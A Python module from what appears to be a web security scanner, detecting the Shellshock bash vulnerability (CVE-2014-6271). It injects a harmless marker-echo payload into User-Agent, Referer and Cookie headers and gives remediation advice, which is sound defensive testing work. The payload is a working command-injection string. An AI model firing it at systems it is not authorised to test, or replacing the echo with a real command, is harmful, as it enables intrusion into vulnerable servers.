"""Active detector: Shellshock (CVE-2014-6271) — bash env-function command injection.

A CGI script exports request headers as environment variables before invoking bash; a
crafted header value that opens with a bash function definition makes a vulnerable bash
execute the trailing command. We send `() { :;}; echo; echo <marker>` in common headers
and confirm by the unique marker echoing back in the body — no echo, no finding, so a
patched or non-CGI server is never flagged.

CWE-78 (OS Command Injection) / OWASP WSTG-INPV-12.
"""

from __future__ import annotations

import secrets
from urllib.parse import urlsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpRequest, InjectionPoint

# Headers a CGI commonly re-exports into the environment (HTTP_USER_AGENT, …).
_SHELLSHOCK_HEADERS = ("User-Agent", "Referer", "Cookie")


def _point(request: HttpRequest, header: str) -> InjectionPoint:
    return InjectionPoint(location="header", name=header, base_value="", request_template=request)


async def check_shellshock(client: HttpClient, requests: list[HttpRequest]) -> list[Finding]:
    """Probe each unique path once per header vector; confirm by the injected marker echo."""
    findings: list[Finding] = []
    probed: set[str] = set()
    for request in requests:
        path = urlsplit(request.url).path or "/"
        if path in probed:
            continue
        probed.add(path)
        marker = "SHELLSHOCK-" + secrets.token_hex(6)
        payload = f"() {{ :;}}; echo; echo {marker}; echo"
        for header in _SHELLSHOCK_HEADERS:
            try:
                response = await client.request(
                    request.method,
                    request.url,
                    params=request.params,
                    headers={**request.headers, header: payload},
                    data=request.data,
                    json=request.json_body,
                )
            except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
                continue
            if marker in response.text:
                findings.append(
                    Finding(
                        id=f"shellshock:{request.method}:{path}:{header}",
                        rule_id="shellshock",
                        name="Shellshock: bash env-function command injection (CVE-2014-6271)",
                        severity="critical",
                        cwe="CWE-78",
                        owasp="WSTG-INPV-12",
                        family="shellshock",
                        injection_point=_point(request, header),
                        evidence=[
                            Evidence(
                                type="response_match",
                                data=f"injected command output echoed via the {header} header (marker {marker})",
                                confidence="high",
                            )
                        ],
                        request=request.model_copy(update={"headers": {**request.headers, header: payload}}),
                        response=response,
                        remediation=(
                            "Patch bash (CVE-2014-6271 and the follow-ups) and move off CGI where possible. "
                            "Do not pass request headers into a shell environment; run CGI with least privilege."
                        ),
                    )
                )
                break
    return findings
